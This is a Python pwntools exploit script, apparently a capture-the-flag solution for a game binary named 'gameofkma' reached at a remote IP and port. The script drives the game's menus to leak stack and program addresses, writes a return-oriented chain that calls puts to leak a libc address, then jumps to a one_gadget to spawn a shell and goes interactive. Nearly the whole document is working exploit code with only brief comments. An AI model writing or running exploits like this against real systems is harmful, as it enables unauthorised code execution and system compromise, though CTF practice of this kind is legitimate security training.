from pwn import *

# r = process('./gameofkma_patched')
# gdb.attach(r, api=True, gdbscript= '''
#            ni 600
#            ni 425
#            ni 820
#            ni 700
#            ''')

r = remote('45.77.248.50', 1337)

n_tr = b'5'
n_hr = b'4'
n_mon = b'2'


main_offset = 0x0000000000001E8A
ret_offset = 0x000000000000101a
one_gadget_off = 0x4f2a5
puts_offset = 0x0000000000001110
pop_rdi_offset = 0x0000000000002483
read_flag_offset = 0x0000000000001D6D
s_libc_subfreeres_off = 0x00000000003e7638

r.sendlineafter(b'want?(0-5)\n', n_tr)
r.sendlineafter(b'monster do you want?(0-2)\n', n_mon)

#Leak stack + main
out = r.recvuntil(b'\n======= ')
main = u64(out.split(b'\n======= ')[0] + b'\x00\x00')
print(hex(main))
out = r.recvuntil(b' =')
temp = b'0x' + out.split(b' =')[0]
stack = int(temp, 16)
print(hex(stack))

base = main - main_offset
ret = ret_offset + base
puts = base + puts_offset
pop_rdi = base + pop_rdi_offset
print(hex(puts))

r.sendlineafter(b'hero do you want?(0-2)\n', n_hr)


#set    ret -> saved rip
#       main -> saved rip + 8
#       pop_rdi -> save rip + 16
r.sendafter(b'hero?\n', p64(0) + p64(ret))
r.sendafter(b'hero?\n', p64(pop_rdi) + p64(0))
r.sendafter(b'hero?\n',p32(19)+ p64(main))
r.sendafter(b'hero?\n', p64(0) + p64(pop_rdi))


num = [615, 946, 1154, 1721, 469, 942, 155, 1044, 1897, 506, 1583, 1925, 394, 310, 970, 1420, 321, 1841, 832, 766]

#raise hero.id 0
for i in range(0,5):
    r.sendlineafter(b'(1/0)\n', b'0')

# Kill monster   
for i in range(0,8):
    r.sendlineafter(b'(1/0)\n', b'1')
    r.sendlineafter(b'> ', str(num[i]).encode('utf-8'))
    
    
r.sendlineafter(b'want?(0-5)\n', n_tr)
r.sendlineafter(b'monster do you want?(0-2)\n', n_mon)
r.sendlineafter(b'hero do you want?(0-2)\n', n_hr)


#pop_rdi đc đẩy lên thành saved rip
#set    stack + 104 địa chỉ libc_subfreeres -> saved rip + 8
#       puts -> saved rip + 16
r.sendafter(b'hero?\n', p32(20) + p64(main))
r.sendafter(b'hero?\n', p64(stack + 104) + p64(puts))
r.sendafter(b'hero?\n',p64(0)+ p64(0))
r.sendafter(b'hero?\n', p64(0) + p64(0))


# Kill hero 0
for i in range(0,16):
    r.sendlineafter(b'(1/0)\n', b'1')
    r.sendlineafter(b'> ', b'1')

# raise hero.id 1
for i in range(0,5):
    r.sendlineafter(b'(1/0)\n', b'0')

# Kill monster 
for i in range(0,4):
    r.sendlineafter(b'(1/0)\n', b'1')
    r.sendlineafter(b'> ', str(num[16 + i]).encode('utf-8'))


# Leak libc
r.recvuntil(b' ==========\n')
out = r.recvuntil(b'Initiating')
s_libc_subfreeres = u64(out.split(b'\nInitiating')[0] + b'\x00'*2)
libc_base = s_libc_subfreeres - s_libc_subfreeres_off
print(hex(libc_base))
one_gadget = libc_base + one_gadget_off

# create shell
r.sendlineafter(b'want?(0-5)\n', n_tr)
r.sendlineafter(b'monster do you want?(0-2)\n', n_mon)
r.sendlineafter(b'hero do you want?(0-2)\n', b'2')
r.sendafter(b'hero?\n', p64(0) + p64(one_gadget))
r.sendafter(b'hero?\n', p64(0))


# raise hero.id 0
for i in range(0,5):
    r.sendlineafter(b'(1/0)\n', b'0')
    
# Kill monster
for i in range(0,8):
    r.sendlineafter(b'(1/0)\n', b'1')
    r.sendlineafter(b'> ', str(num[i]).encode('utf-8'))

r.interactive()